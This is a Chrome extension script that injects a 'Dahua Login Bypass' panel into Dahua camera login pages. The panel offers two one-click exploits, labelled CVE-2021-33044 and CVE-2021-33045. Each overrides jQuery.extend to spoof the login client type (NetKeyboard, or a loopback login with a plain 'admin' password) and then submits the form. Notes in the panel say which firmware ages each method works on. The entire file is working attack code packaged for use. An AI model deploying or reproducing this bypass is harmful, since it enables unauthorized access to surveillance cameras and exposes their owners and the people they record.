async function loginBypass()
{
	if (window.bypassLoaded)
		return;
	window.bypassLoaded = true;
	let allowed = false;
	if (document.getElementById("login_user") && document.getElementById("login_psw"))
		allowed = true;
	if (!allowed)
	{
		if (confirm("This page was not identified as a Dahua camera login page. Attempt login anyway?"))
			allowed = true;
	}
	if (!allowed)
		return;

	let hackMenu = '<div style="margin-bottom: 10px; font-size: 18px;">Dahua Login Bypass &#10024;</div>';
	hackMenu += '<div style="margin-bottom: 10px; font-size: 12px;">Try a button. If it does not work, reload the page and try the other button.</div>';
	hackMenu += '<div style="margin-bottom: 10px; font-size: 12px;">Method 1 should work on most cameras that have not been updated after Sept 2021.</div>';
	hackMenu += '<div style="margin-bottom: 10px; font-size: 12px;">Method 2 did not work for me in testing but may work for you if firmware is older than beginning/mid 2020.</div>';
	hackMenu += '<div>';

	hackMenu += '<input type="button" id="dlb_method_1" class="u-button fn-width80" value="Method 1" title="CVE-2021-33044" onclick="'
		+ 'if (!window.didAlreadyOverrideExtend) { '
		+ 'window.didAlreadyOverrideExtend = true; '
		+ 'var originalExtend = jQuery.extend; '
		+ 'jQuery.extend = function ()'
		+ '{'
		//+ ' console.log(&quot;extend override&quot;, JSON.stringify(arguments[0]), JSON.stringify(arguments[1]), JSON.stringify(arguments[2]), JSON.stringify(arguments[3]));'
		+ ' if ('
		+ 'arguments.length == 2'
		+ ' && typeof arguments[0].userName !== &quot;undefined&quot;'
		+ ' && arguments[0].password'
		+ ' && arguments[0].clientType === &quot;Web3.0&quot;'
		+ ')'
		+ ' { '
		+ '   let extended = originalExtend.apply(window, arguments);'
		+ '   extended.clientType = &quot;NetKeyboard&quot;;'
		+ '   return extended;'
		+ ' }'
		+ ' else'
		+ ' {'
		+ '   let extended = originalExtend.apply(window, arguments);'
		+ '   return extended;'
		+ ' } '
		+ '}; '
		+ 'document.getElementById(&quot;login_user&quot;).value = &quot;admin&quot;; '
		+ 'document.getElementById(&quot;login_psw&quot;).value = &quot;Not Used&quot;; '
		+ 'document.querySelector(\'a[btn-for=&quot;onLogin&quot;]\').click(); '
		+ 'document.getElementById(&quot;dlb_method_1&quot;).setAttribute(&quot;disabled&quot;, &quot;disabled&quot;); '
		+ 'document.getElementById(&quot;dlb_method_2&quot;).setAttribute(&quot;disabled&quot;, &quot;disabled&quot;); '
		+ '}'
		+ '" />';

	hackMenu += '<input type="button" id="dlb_method_2" class="u-button fn-width80" value="Method 2" title="CVE-2021-33045" onclick="'
		+ 'if (!window.didAlreadyOverrideExtend) { '
		+ 'window.didAlreadyOverrideExtend = true; '
		+ 'var originalExtend = jQuery.extend; '
		+ 'jQuery.extend = function ()'
		+ '{'
		+ ' if ('
		+ 'arguments.length == 2'
		+ ' && typeof arguments[0].userName !== &quot;undefined&quot;'
		+ ' && typeof arguments[0].password !== &quot;undefined&quot;'
		+ ' && arguments[0].clientType === &quot;Web3.0&quot;'
		+ ')'
		+ ' { '
		+ ' console.log(&quot;extend override&quot;, JSON.stringify(arguments[0]), JSON.stringify(arguments[1]), JSON.stringify(arguments[2]), JSON.stringify(arguments[3]));'
		+ '   let extended = originalExtend.apply(window, arguments);'
		+ '   extended.ipAddr = &quot;127.0.0.1&quot;;'
		+ '   extended.loginType = &quot;Loopback&quot;;'
		+ '   extended.clientType = &quot;Local&quot;;'
		+ '   extended.passwordType = &quot;Plain&quot;;'
		+ '   extended.password = &quot;admin&quot;;'
		+ '   return extended;'
		+ ' }'
		+ ' else'
		+ ' {'
		+ '   let extended = originalExtend.apply(window, arguments);'
		+ '   return extended;'
		+ ' } '
		+ '}; '
		+ 'document.getElementById(&quot;login_user&quot;).value = &quot;admin&quot;; '
		+ 'document.getElementById(&quot;login_psw&quot;).value = &quot;Not Used&quot;; '
		+ 'document.querySelector(\'a[btn-for=&quot;onLogin&quot;]\').click(); '
		+ 'document.getElementById(&quot;dlb_method_1&quot;).setAttribute(&quot;disabled&quot;, &quot;disabled&quot;); '
		+ 'document.getElementById(&quot;dlb_method_2&quot;).setAttribute(&quot;disabled&quot;, &quot;disabled&quot;); '
		+ '}'
		+ '" />';

	hackMenu += '</div>';

	let div = document.createElement('div');
	div.style.marginTop = '10px';
	div.style.padding = '20px';
	div.style.backgroundColor = '#FFFFFF';
	div.style.border = '3px solid rgba(0,0,0,1)';
	div.style.borderRadius = '8px';
	div.style.boxShadow = '0 0 16px rgb(0 0 0 / 50%)';
	div.style.backdropFilter = 'filter: blur(8px)';
	div.style.position = 'relative';
	div.style.left = '-72px';
	div.innerHTML = hackMenu;
	document.querySelector('a[btn-for="onLogin"]').parentNode.appendChild(div);
}
chrome.action.onClicked.addListener(tab =>
{
	chrome.scripting.executeScript({
		target: { tabId: tab.id },
		function: loginBypass,
	});
});